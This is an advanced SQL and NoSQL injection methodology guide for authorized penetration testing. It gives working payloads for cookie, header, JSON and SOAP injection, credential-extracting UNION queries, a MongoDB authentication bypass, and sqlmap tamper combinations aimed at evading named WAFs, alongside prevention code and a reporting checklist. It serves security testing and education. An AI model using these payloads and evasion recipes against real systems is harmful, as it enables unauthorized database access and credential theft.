# SQL Injection -- Advanced Techniques and Methodology

> For authorized security testing, red team exercises, and educational study only. This document expands on the cheat sheet with deeper attack chains, alternative injection points, and methodology for thorough SQLi assessment.

---

## Prerequisites

- Solid understanding of SQL syntax across major DBMS (MySQL, MSSQL, PostgreSQL, Oracle, SQLite)
- Familiarity with HTTP request/response lifecycle (headers, cookies, request body encoding)
- Working knowledge of `sqlmap`, Burp Suite, and manual injection techniques
- Lab environment or authorized target (DVWA, SQLi-labs, HackTheBox, PortSwigger labs)
- See `sheets/offensive/sql-injection.md` for quick-reference syntax

---

## 1. Injection Points Beyond URL Parameters

Most SQLi training focuses on GET/POST parameters, but real applications accept input through many channels.

### 1.1 Cookie Injection

Applications that use cookie values in SQL queries (session lookups, preference storage, shopping carts) are vulnerable when values are not parameterized.

```http
GET /dashboard HTTP/1.1
Host: target.com
Cookie: user_id=1' AND 1=CONVERT(int,@@version)--
```

```bash
# sqlmap cookie testing
sqlmap -u "http://target.com/dashboard" --cookie="user_id=1*" --level=3
```

Key indicators: applications that store user preferences, roles, or IDs in cookies rather than server-side sessions. Legacy apps that parse cookie values directly into queries are common targets.

### 1.2 HTTP Header Injection

Headers frequently logged or processed by the application layer without sanitization.

```http
GET /page HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1' UNION SELECT username,password FROM users--
Referer: http://evil.com' OR 1=1--
User-Agent: Mozilla' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

Commonly vulnerable headers:
- `X-Forwarded-For` -- logged in analytics/audit tables
- `Referer` -- logged for traffic analysis
- `User-Agent` -- logged in access tables, sometimes used in device fingerprinting
- `Host` -- multi-tenant apps routing by host header
- `Accept-Language` -- localization lookups

```bash
# sqlmap header testing
sqlmap -u "http://target.com/page" --headers="X-Forwarded-For: 1*" --level=5
```

### 1.3 JSON Body Injection

REST APIs accepting JSON payloads are susceptible when values are interpolated into queries.

```json
POST /api/search HTTP/1.1
Content-Type: application/json

{
  "query": "shoes' UNION SELECT username,password,3 FROM users--",
  "category": 1
}
```

```bash
# sqlmap with JSON body
sqlmap -u "http://target.com/api/search" --data='{"query":"shoes","category":1}' -p query --dbms=mysql
```

Watch for: APIs that accept structured JSON but flatten values into raw SQL on the backend. GraphQL endpoints are another vector where the underlying resolvers may use string concatenation.

### 1.4 XML / SOAP Injection

XML-based services (SOAP, legacy APIs) are tested by injecting into element values.

```xml
POST /ws/UserService HTTP/1.1
Content-Type: text/xml

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <getUser>
      <userId>1' OR 1=1--</userId>
    </getUser>
  </soapenv:Body>
</soapenv:Envelope>
```

XML entities can also be used for obfuscation:

```xml
<userId>1&#39; OR 1=1--</userId>
```

---

## 2. Second-Order SQL Injection Attack Chains

Second-order SQLi occurs when user input is stored safely but later used unsafely in a different query context. Scanners rarely detect this because the injection and execution happen in separate requests.

### 2.1 Classic Attack Chain

```
Step 1: INJECT     -- Register with username: admin'--
Step 2: STORE      -- App stores "admin'--" in users table (properly escaped on INSERT)
Step 3: TRIGGER    -- User changes password
Step 4: EXECUTE    -- Backend runs:
                      UPDATE users SET password='newpass' WHERE username='admin'--'
                      This sets the admin password, not the attacker's
```

### 2.2 Identification Methodology

1. **Map stored inputs**: Identify every place user input is persisted (registration, profile updates, comments, file uploads with metadata, address fields).
2. **Trace data reuse**: Determine where stored values reappear in application logic (admin panels, reports, password reset, email templates, exports).
3. **Inject markers**: Use distinct payloads in each stored field so you can identify which field triggers execution.
4. **Trigger and observe**: Exercise every application function that reads stored data and monitor for errors, behavioral changes, or time delays.

### 2.3 Common Second-Order Vectors

| Injection Point | Trigger Point |
|-----------------|---------------|
| Username at registration | Password change, admin user listing |
| Address/profile fields | Invoice generation, PDF export |
| File upload filename | File listing, download handler |
| Comment/review text | Admin moderation panel, search index rebuild |
| API key description | API key management dashboard |

### 2.4 Testing with sqlmap

sqlmap has limited second-order support via `--second-url`:

```bash
# Inject via registration, observe via profile page
sqlmap -u "http://target.com/register" --data="username=test&password=test" -p username \
  --second-url="http://target.com/profile" --batch
```

For complex chains, manual testing with Burp Suite macros or custom scripts is more effective.

---

## 3. sqlmap Tamper Scripts Internals

Tamper scripts modify the payload before sending, primarily for WAF evasion. Understanding their internals helps in writing custom tampers and choosing the right combination.

### 3.1 How Tamper Scripts Work

Each tamper script is a Python module with a `tamper(payload, **kwargs)` function that receives the raw payload string and returns a modified version. Scripts are chained in order.

```python
# Simplified tamper script structure
# Located in: sqlmap/tamper/example.py

def dependencies():
    pass  # check for required libraries

def tamper(payload, **kwargs):
    # Modify and return the payload
    retVal = payload
    if payload:
        retVal = payload.replace(" ", "/**/")
    return retVal
```

### 3.2 Key Built-in Tamper Scripts

| Script | Transformation | Target WAF/DBMS |
|--------|---------------|-----------------|
| `space2comment` | `UNION SELECT` -> `UNION/**/SELECT` | Generic |
| `space2hash` | Space -> `%23\n` (MySQL `#` comment + newline) | MySQL |
| `space2morehash` | Extended hash comment with random text | MySQL |
| `space2mssqlblank` | Space -> random blank char (`%01-%0F`) | MSSQL |
| `between` | `>` -> `NOT BETWEEN 0 AND`, `=` -> `BETWEEN X AND X` | Generic |
| `randomcase` | `SELECT` -> `SeLeCt` | Generic |
| `charencode` | URL-encode all characters | Generic |
| `chardoubleencode` | Double URL-encode | Generic |
| `equaltolike` | `=` -> `LIKE` | Generic |
| `greatest` | `>` -> `GREATEST(X,Y)=X` | MySQL |
| `ifnull2ifisnull` | `IFNULL(A,B)` -> `IF(ISNULL(A),B,A)` | MySQL |
| `multiplespaces` | Insert multiple spaces around keywords | Generic |
| `percentage` | `SELECT` -> `%S%E%L%E%C%T` (IIS) | MSSQL/IIS |
| `sp_password` | Append `sp_password` to hide from logs | MSSQL |
| `unionalltounion` | `UNION ALL SELECT` -> `UNION SELECT` | Generic |
| `versionedkeywords` | `UNION` -> `/*!UNION*/` | MySQL |
| `versionedmorekeywords` | More keywords wrapped in version comments | MySQL |

### 3.3 Effective Tamper Combinations

```bash
# ModSecurity / OWASP CRS
sqlmap -u "URL" --tamper=space2comment,between,randomcase,charencode

# AWS WAF
sqlmap -u "URL" --tamper=space2comment,charencode,equaltolike,greatest

# Cloudflare
sqlmap -u "URL" --tamper=space2comment,between,randomcase,versionedkeywords

# IIS + MSSQL
sqlmap -u "URL" --tamper=space2mssqlblank,percentage,sp_password

# Generic aggressive evasion
sqlmap -u "URL" --tamper=space2comment,between,randomcase,charencode,equaltolike --random-agent
```

### 3.4 Writing a Custom Tamper Script

```python
#!/usr/bin/env python
# custom_tamper.py - place in sqlmap/tamper/ directory

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces spaces with parenthesized grouping where possible
    Example: UNION SELECT -> UNION(SELECT)
    """
    if payload:
        payload = payload.replace("UNION SELECT", "UNION(SELECT")
        payload = payload.replace(" FROM ", ")FROM(")
        # close any opened parens
        if "(SELECT" in payload and ")FROM" not in payload:
            payload += ")"
    return payload
```

```bash
# Use custom tamper
sqlmap -u "URL" --tamper=custom_tamper
```

---

## 4. NoSQL Injection

NoSQL databases use different query syntax but are vulnerable to analogous injection attacks when user input is incorporated into query objects without validation.

### 4.1 MongoDB Injection

MongoDB queries use JSON/BSON objects. Injection occurs when user input is parsed as query operators.

```javascript
// Vulnerable Node.js code
db.users.find({ username: req.body.username, password: req.body.password });

// Attack: POST body
// Content-Type: application/json
{ "username": "admin", "password": {"$ne": ""} }
// Equivalent to: WHERE username='admin' AND password != ''
// Returns admin user regardless of password

// Other operator injections
{ "username": {"$gt": ""}, "password": {"$gt": ""} }       // return all users
{ "username": "admin", "password": {"$regex": "^p"} }      // brute-force password prefix
{ "username": {"$in": ["admin","root"]}, "password": {"$ne": ""} }
```

**URL parameter injection (PHP):**

```
# PHP apps that parse array syntax from URLs
http://target.com/login?username=admin&password[$ne]=wrong
http://target.com/login?username[$gt]=&password[$gt]=
http://target.com/login?username=admin&password[$regex]=^pass
```

**JavaScript injection (server-side eval):**

```javascript
// If the app uses $where with user input
// Vulnerable: db.users.find({ $where: "this.username == '" + input + "'" })

// Attack input:
' || 1==1//
'; return true;//
'; sleep(5000);//    // time-based blind
```

### 4.2 CouchDB Injection

CouchDB uses HTTP API with JSON. Injection targets Mango queries or view parameters.

```json
// Mango query injection
POST /_find
{
  "selector": {
    "username": "admin",
    "password": {"$gt": null}
  }
}

// View parameter injection
GET /db/_design/app/_view/by_user?key="admin"&stale=ok
// Inject into key parameter
GET /db/_design/app/_view/by_user?key="admin"%00"&stale=ok
```

### 4.3 NoSQL Detection Checklist

1. Send `{"$gt":""}` as parameter values -- if the app returns data, operators are being parsed
2. Try `[$ne]=invalid` in URL-encoded form data for PHP targets
3. Test `$regex` operators for blind data extraction
4. Check for JavaScript execution via `$where` clauses
5. Look for timing differences with `sleep()` in `$where` context

### 4.4 Prevention

```javascript
// Sanitize: strip $ operators from user input
const sanitize = require('mongo-sanitize');
db.users.find({ username: sanitize(req.body.username) });

// Or explicitly cast to string
db.users.find({ username: String(req.body.username) });

// Use mongoose with schema validation
const userSchema = new Schema({
  username: { type: String, required: true },
  password: { type: String, required: true }
});
```

---

## 5. ORM Bypass Techniques

ORMs (Object-Relational Mappers) provide parameterized queries by default, but developers frequently bypass safety features for flexibility.

### 5.1 Raw Query Methods

Every major ORM provides escape hatches that reintroduce SQLi risk.

```python
# Django -- UNSAFE raw queries
User.objects.raw("SELECT * FROM users WHERE id = %s" % user_id)
User.objects.extra(where=["name = '%s'" % name])

# Django -- SAFE
User.objects.raw("SELECT * FROM users WHERE id = %s", [user_id])
User.objects.filter(id=user_id)

# SQLAlchemy -- UNSAFE
session.execute(f"SELECT * FROM users WHERE id = {user_id}")
session.execute(text("SELECT * FROM users WHERE id = " + user_id))

# SQLAlchemy -- SAFE
session.execute(text("SELECT * FROM users WHERE id = :id"), {"id": user_id})
session.query(User).filter(User.id == user_id)

# ActiveRecord (Ruby) -- UNSAFE
User.where("name = '#{params[:name]}'")
User.find_by_sql("SELECT * FROM users WHERE name = '#{params[:name]}'")

# ActiveRecord -- SAFE
User.where(name: params[:name])
User.where("name = ?", params[:name])

# Hibernate (Java) -- UNSAFE
session.createQuery("FROM User WHERE name = '" + name + "'")

# Hibernate -- SAFE
session.createQuery("FROM User WHERE name = :name").setParameter("name", name)
```

### 5.2 Order-By Injection

Many ORMs do not parameterize `ORDER BY` clauses because column names cannot be bound as parameters.

```python
# Django -- vulnerable to ORDER BY injection
User.objects.order_by(request.GET['sort'])
# Attack: ?sort=name;SELECT+pg_sleep(5)

# Defense: whitelist allowed sort columns
ALLOWED_SORTS = {'name', 'email', 'created_at'}
sort_field = request.GET.get('sort', 'name')
if sort_field not in ALLOWED_SORTS:
    sort_field = 'name'
User.objects.order_by(sort_field)
```

### 5.3 LIKE/Contains Injection

ORM contains/startswith methods are parameterized but can leak data via wildcard abuse.

```python
# Django -- safe from SQLi but vulnerable to data leakage
User.objects.filter(email__contains=user_input)
# Input: %   -> matches all emails
# Input: @admin  -> finds admin domain emails

# Defense: escape wildcards
import re
safe_input = re.escape(user_input)
```

### 5.4 JSON/Array Column Queries

Modern ORMs support JSON columns with query syntax that may bypass standard parameterization.

```python
# Django JSONField -- potentially unsafe with raw lookups
User.objects.filter(metadata__contains=user_supplied_json)

# SQLAlchemy JSON -- raw JSON path expressions
session.query(User).filter(User.metadata["key"].as_string() == value)
```

---

## 6. Automated vs Manual SQLi Methodology

A thorough SQLi assessment combines automated scanning for breadth with manual testing for depth.

### 6.1 Automated Phase

**Objective:** Identify low-hanging fruit across the entire attack surface.

```
Step 1: CRAWL
  - Burp Spider / OWASP ZAP spider the entire application
  - Export discovered URLs and parameters
  - Include authenticated and unauthenticated surfaces

Step 2: SCAN
  - Feed URLs to sqlmap with moderate settings
    sqlmap -m urls.txt --batch --level=2 --risk=2 --threads=4 --output-dir=./results
  - Run Burp Scanner active scan on all insertion points
  - Use --forms flag for automated form detection
    sqlmap -u "http://target.com/search" --forms --batch --crawl=3

Step 3: TRIAGE
  - Review confirmed vulnerabilities
  - Note false positives (time-based on slow servers)
  - Catalog injection points for manual follow-up
```

**Automated scanning limitations:**
- Cannot detect second-order injection
- Poor at multi-step injection chains (login -> action -> trigger)
- Often blocked by WAFs, CAPTCHAs, rate limiting
- Limited understanding of business logic context
- Miss injection points in non-standard locations (WebSocket messages, GraphQL, file upload metadata)

### 6.2 Manual Phase

**Objective:** Test areas that automated tools miss and validate findings.

```
Step 1: MAP APPLICATION LOGIC
  - Identify all data entry points (forms, APIs, file uploads, headers)
  - Trace where each input is stored and reused
  - Map authentication and session flows
  - Identify admin/privileged functionality

Step 2: TARGETED INJECTION TESTING
  - Test each parameter type individually
  - Try both string and integer injection contexts
  - Test secondary injection points (cookies, headers, JSON bodies)
  - Use conditional responses for blind detection:
    TRUE:  AND 1=1  /  AND 'a'='a'
    FALSE: AND 1=2  /  AND 'a'='b'

Step 3: SECOND-ORDER TESTING
  - Register accounts with SQLi payloads in each field
  - Update profile fields with test payloads
  - Exercise admin panels, reports, export functions
  - Monitor for delayed error messages or behavioral changes

Step 4: EXPLOITATION AND EVIDENCE
  - Extract proof-of-concept data (version, current user, database name)
  - Document exact request/response pairs
  - Demonstrate impact without exceeding scope
  - Test for escalation: file read, OS command execution, privilege escalation

Step 5: WAF EVASION (if blocked)
  - Identify WAF product (response headers, block pages)
  - Try encoding variations, comment insertion, case changes
  - Use sqlmap tamper scripts targeted at identified WAF
  - Test with --random-agent and --delay to avoid rate limiting
```

### 6.3 Reporting Checklist

For each confirmed vulnerability, document:

1. **Injection point**: Exact parameter, header, or field
2. **Injection type**: In-band / blind / out-of-band, specific subtype
3. **DBMS**: Confirmed database type and version
4. **Proof of concept**: Minimal payload demonstrating the vulnerability
5. **Impact**: What data is accessible, can OS commands execute, privilege level
6. **Request/response**: Full HTTP request and relevant response excerpt
7. **Remediation**: Specific code fix (parameterized query replacement)
8. **CVSS score**: Based on access complexity, impact, and authentication requirements
